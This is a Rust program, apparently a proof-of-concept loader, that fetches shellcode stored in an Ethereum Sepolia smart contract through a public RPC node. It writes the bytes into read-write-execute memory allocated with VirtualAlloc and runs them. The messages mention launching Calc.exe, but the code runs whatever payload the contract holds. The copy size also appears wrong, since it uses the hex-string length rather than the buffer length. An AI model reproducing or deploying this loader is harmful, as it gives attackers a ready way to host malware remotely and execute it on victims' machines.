use web3::contract::{Contract, Options};
use web3::types::Address;
use std::str::FromStr;
use std::ptr;
use anyhow::{Result, Context};

use tokio;

use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::shared::minwindef::LPVOID;

const CONTRACT_ADDRES: &str = "0xD57c5867BbD350B97cff9FAd9569089a0Af2EC1d";

const CONTRACT_ABI: &str = r#"
	[{
		"inputs": [],
		"name": "getShellcode",
		"outputs": [
			{
				"internalType": "bytes",
				"name": "",
				"type": "bytes"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}]
"#;

const RPC_URL: &str = "https://ethereum-sepolia.publicnode.com";

#[tokio::main]
async fn main() -> Result<()> {
	println!("[+] Connecting to Ethereum Node ...");

	let transport = web3::transports::Http::new(RPC_URL)
		.context("[!] Failed to create HTTP transport")?;
	let web3 = web3::Web3::new(transport);

	let contract_address = Address::from_str(CONTRACT_ADDRES)
		.context("[!] Invalid contract address")?;
	let contract = Contract::from_json(
		web3.eth(),
		contract_address,
		CONTRACT_ABI.as_bytes(),
	).context("[!] Failed to parse contract ABI")?;

	println!("[+] Retrieving shellcode from contract ...");

	let shellcode: Vec<u8> = contract.query(
		"getShellcode",
		(),
		None,
		Options::default(),
		None,
	).await.context("[!] Query to get shellcode failed")?;
	let calc2 = shellcode.iter().map(|b| format!("0x{:02x}", b)).collect::<Vec<_>>().join(",");
	println!("[+] Shellcode as Hex {} ", calc2);

	let calcsize = calc2.len();

	if !shellcode.is_empty() {
		println!("[+] Allocating memory ...");

		unsafe {
			let size = shellcode.len();

			let mem = VirtualAlloc(
				ptr::null_mut(),
				calcsize,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE,
			);

			if mem.is_null() {
				anyhow::bail!("[!] VirtualAlloc failed: {}", std::io::Error::last_os_error());
			}


			println!("[+] Copying Shellcode to Allocated Memory ...");
			std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, calcsize);
			println!("[+] Executing Shellcode ...");
			println!("[+] Expect Calc.exe ...");
			let func: extern "C" fn() = std::mem::transmute(mem);
			func();
		}
	}

	Ok(())
}
